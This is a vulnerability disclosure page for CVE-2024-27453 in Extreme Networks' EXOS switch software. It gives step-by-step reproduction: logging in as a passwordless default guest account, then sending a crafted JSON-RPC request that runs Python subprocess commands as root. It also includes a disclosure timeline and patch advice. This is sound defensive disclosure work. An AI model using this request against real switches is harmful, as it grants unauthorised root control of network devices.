<!DOCTYPE HTML>
<html><head>
	<title>CVE-2024-27453</title>
	<meta charset="utf-8">
	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
	<meta name="viewport" content="width=device-width, initial-scale=1"><link rel="stylesheet" href="assets/css/main_blog.css">
	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
	<link rel="manifest" href="images/site.webmanifest">
</head>
<body>

		<!-- Header -->
			
			
			<!-- Main --><section id="main"><div class="inner">
				<header id="header" style="background-color:#000;">
				
					<a href="index.html"> 
						<span ><img src="images/ExsiliumLogoTR.png" height="25%" width="25%" alt=""></span>
					</a>
				
				</header>
				<!-- One -->
					<section id="one" class="wrapper style1"><div class="image fit flush">
							<!--<img src="images/pic02.jpg" alt="" width="1177" height="443">--></div>
						<header class="special"><h2>CVE-2024-27453</h2>
							<p>EXOS Privilege Escalation from Guest to Root (RCE) via Python MMI</p>
						</header><div class="content">
							<h2>SUMMARY</h2>
							<p>Jason Goss uncovered a vulnerability in version 22.6.1.4 of Extreme Networks' operating system, ExtremeXOS (EXOS), which has been designated as CVE-2024-27453. After this discovery, Extreme Networks was notified and agreed to proceed under their responsible disclosure process.</p>
							<p>This vulnerability enables attackers to escalate privileges from a read-only user account to root by crafting a request to the <a href="https://documentation.extremenetworks.com/app_notes/MMI/121152_MMI_Application_Release_Notes.pdf">Machine-to-Machine Interface (MMI)</a>. Successful exploitation allows for remote code execution (RCE) on the switch with root privileges, giving the attacker total control over the device. Additionally, the presence of a default read-only user account commonly configured on these devices significantly simplifies exploitation.</p>
							<h2>VULNERABILITY DETAILS</h2>
							<p>To exploit this vulnerability, begin by logging into the device with a read-only user account while proxying the request through a web interception proxy (e.g., Burp, OWASP ZAP). This step is simplified due to the default configuration of this version of EXOS, which includes a guest user account with the username <code>User</code> and no password.</p>
							<p>Once authenticated, the version number is displayed on the left-hand side of the dashboard.</p><span ><img class="report" src="images/Version-CVE-2024-27453.jpg" height="75%" width="75%" alt=""></span>
							<p>After verifying the version number from the dashboard, switch to the interception proxy and copy the cookie containing the session tokens.</p>
<pre>
<code class="codefix">Cookie: x-auth-token=[redacted]; session=[redacted]; chalet_locale=en; session_id=[redacted]; x-auth-token= [redacted].[redacted].[redacted]; session= [redacted].[redacted].[redacted]
</code></pre>
<p>To verify that you have the correct cookie, the <code>x-auth-token</code> can be base64 decoded to obtain the username, access level, and expiration (in epoch format):</p>
<pre>
<code class="codefix">{'alg':'HS256','exp':1714545903,'iat':1714459503,'username':'user','access_level':'user'}
</code></pre>
						<p>Once obtained, a request to the python method of the <a href="https://documentation.extremenetworks.com/app_notes/MMI/121152_MMI_Application_Release_Notes.pdf">Machine-to-Machine Interface (MMI)</a> can be crafted to include the python subprocess module. This allows for the execution of commands on the host operating system (EXOS) as root. In the example below, a request is made to obtain the environment variables (e.g., <code>env</code>) which contains the current username (e.g., root):</p>

<pre><code class="codefix">POST /jsonrpc/?show HTTP/1.1
Host: XXX.XXX.XXX.XXX
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: chalet_locale=en; session_id=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; x-auth-token= XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; session= XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX.XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Connection: close
Content-Type: application/json
Content-Length: 129

{"method":"python","id":"10","jsonrpc":"2.0","params":["import subprocess\nprint\nprint subprocess.check_output([\"env\"])"]
</code></pre>
					<p>This results in the switch returning the EXOS environmental variables including the <code>USER</code> variable confirming root access to the device:</p>
					<span ><img class="report" src="images/Response-CVE-2024-27453.jpg" height="75%" width="75%" alt=""></span><p> </p>
					<h2>RECOMMENDATIONS</h2>
					<p>CVE-2024-27453 has been addressed in EXOS versions 22.7 and later. Users are strongly advised to update their systems to the most recent version. It is also recommended to enable "Enhanced Security Mode," which removes all factory default login accounts, including the default guest account used in this article.</p>
					<h2>TIMELINE</h2>
					<table>
						<tr>
						  <th>Date</th>
						  <th>Action</th>
						</tr>
						<tr>
						  <td>January 29, 2024</td>
						  <td>Notified Extreme Networks about the vulnerability</td>
						</tr>
						<tr>
							<td>February 7, 2024</td>
							<td>Discussions began with Extreme Networks</td>
						  </tr>
						<tr>
						  <td>February 26, 2024</td>
						  <td>Recieved the CVE Number</td>
						</tr>
						<tr>
							<td>March 22, 2024</td>
							<td>Extreme Networks responed with the correct POC</td>
						</tr>
						<tr>
							<td>April 4, 2024</td>
							<td>Agreed to responsible disclosure timeline</td>
						</tr>
						<tr>
							<td>April 23, 2024</td>
							<td>Notified about the fix and Security Advisory ID</td>
						</tr>
					  </table>
					  <h2>REFERENCES</h2>
					  <p class="listintro">The following references are available regarding this vulnerability:</p>
					  <ul>
						<li><a href="https://extreme-networks.my.site.com/ExtrArticleDetail?an=000118266">Extreme Networks Security Advisory</a></li>
						<li><a href="https://www.cve.org/CVERecord?id=CVE-2024-27453">CVE-2024-27453</a></li>
						<li><a href="https://documentation.extremenetworks.com/app_notes/MMI/121152_MMI_Application_Release_Notes.pdf">Machine-to-Machine Interface (MMI)</a></li>
					</ul>
						</div>
					</section></div>
			</section><!-- Footer --><footer id="footer"><div class="container">
					<ul class="icons"><li><a href="#" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
						<li><a href="#" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
						<li><a href="#" class="icon fa-instagram"><span class="label">Instagram</span></a></li>
						<li><a href="#" class="icon fa-envelope-o"><span class="label">Email</span></a></li>
					</ul></div>
			</footer><div class="copyright">
				&copy; Exsilium Security.</a>
		</div>

		<!-- Scripts -->
			<script src="assets/js/jquery.min.js"></script><script src="assets/js/jquery.poptrox.min.js"></script><script src="assets/js/skel.min.js"></script><script src="assets/js/util_blog.js"></script><script src="assets/js/main_blog
			.js"></script></body></html>
